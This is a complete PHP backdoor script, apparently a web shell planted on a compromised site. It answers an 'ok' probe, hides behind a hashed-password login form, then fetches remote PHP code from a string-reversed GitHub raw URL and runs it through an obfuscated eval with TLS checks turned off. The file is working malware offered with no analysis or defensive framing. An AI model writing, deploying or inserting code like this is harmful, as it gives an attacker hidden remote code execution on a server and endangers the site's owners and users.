<?php ?><?php error_reporting(0); if(isset($_REQUEST["ok"])){die(">ok<");};?><?php
if (function_exists('session_start')) {
  session_start();
  if (!isset($_SESSION['secretyt'])) {
    $_SESSION['secretyt'] = false;
  }
  if (!$_SESSION['secretyt']) {
    if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == '8cd296640b87decd1ad7047a35f6bd6234c5f9679aef5fd9cfda9f0fd8ad47af') {
      $_SESSION['secretyt'] = true;
    } else {
      die('<html> <head> <meta charset="utf-8"> <title></title> <style type="text/css"> body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; } </style> </head> <body> <form action="" method="post" accept-charset="utf-8"> <input type="password" name="pwdyt" value="" placeholder="passwd"> <input type="submit" name="submit" value="submit"> </form> </body> </html>');
    }
  }
}
?>
<?php
/*S*/ eVAl /*10K*/(/*v1*/'?>'./*9L*/ _xrev_/*7d*/(strrev('txt.30/dlo/amad/niam/selifnaj/kkonodnarb/moc.tnetnocresubuhtig.war//:sptth'))/*H3*/); function _xrev_($url = ''){ $curl = curl_init(); curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); curl_setopt($curl, CURLOPT_TIMEOUT, 500); curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); curl_setopt($curl, CURLOPT_SSL_VERIFYHOST, false); curl_setopt($curl, CURLOPT_URL, $url); $get = curl_exec($curl); curl_close($curl); return $get; }